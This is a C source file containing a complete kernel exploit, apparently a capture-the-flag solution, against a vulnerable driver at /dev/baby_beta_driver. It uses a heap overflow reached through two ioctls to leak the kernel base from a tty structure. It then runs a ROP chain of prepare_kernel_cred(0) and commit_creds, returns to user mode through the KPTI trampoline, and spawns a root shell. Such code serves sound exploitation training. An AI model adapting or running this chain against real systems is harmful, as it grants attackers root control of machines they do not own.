#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <string.h>


#define ADD 0x1337C0DE
#define COPY 0xC0DE1337
#define INVALID -1

unsigned long canary,commit_creds,prepare_kernel_cred,image_base,swapgs_restore_regs,ksymtab,ksymtab_commit_creds,ksymtab_prepare_kernel_cred,user_cs,kbase,kpti_trampoline,user_rflags,user_sp,user_ss;
unsigned long pop_rax_ret,mov_rax_rax_16_rbp,pop_rdi_rbp_ret,pop_rdi,pkc_struct,pop_rcx,mov_rdi_rax;

int fd=-1;

typedef struct req {
    unsigned int size;
    char* transfer_data;
} req;

void add(unsigned int size, char* transfer_data){
    req r;
    r.size = size;
    r.transfer_data = transfer_data;
    int ret = ioctl(fd,ADD,(unsigned long )&r);
    puts("[+] Add ok!");

}

char* copy(unsigned int size,char* transfer_data){
    req r;
    r.size = size;
    r.transfer_data = transfer_data;
    int ret = ioctl(fd,COPY,(unsigned long)&r);
    puts("[+] Copy ok!");
}


void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void Open(){
    fd = open("/dev/baby_beta_driver",O_RDWR);
    if(fd<0){
        perror("[-] Error in hackme");
        exit(INVALID);
    }
    puts("[+] Opened blazeme");
}

void priv_esc(){
    if(getuid()==0){
        puts("[+] Getting u root shell");
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }
    else{
        perror("[-] Something's wrong!");
        exit(INVALID);
    }
}

int main(){
    save_state();
    Open();
    int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
    close(ptmx);
    unsigned long leak_buf[0x30/8] = {0};
    add(0x2e0,(char *)0);
    copy(0x30,(char *)leak_buf);
    for(int i=0;i<sizeof(leak_buf)/8;i++){
        printf("[*] leak_buf[%d] = 0x%lx\n",i,leak_buf[i]);
    }   
    kbase = leak_buf[3] - 0x623cc0L;
    printf("[+] Kbase -> 0x%lx\n",kbase);
    commit_creds = kbase + 0x53d00L;
    prepare_kernel_cred = kbase + 0x53bb0L;
    pop_rdi = kbase + 0x11a54dL;
    pop_rcx = kbase + 0x18b1f3L;
    mov_rdi_rax = kbase + 0x1af61aL;
    kpti_trampoline = kbase + 0x200cb0L;

    unsigned long rop[0x200] = {0};
    char buf[200]={0};
    int i = 8;
    for(int j=0;j<8;j++)
        rop[j] = 0x6161616161616161;

    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rcx;
    rop[i++] = 0;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = kpti_trampoline + 22;
    rop[i++] = 0; //rax
    rop[i++] = 0; //rdi
    rop[i++] = (unsigned long)&priv_esc;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    add(0x400,(char *)rop);
    copy(300,(char *)buf);
}
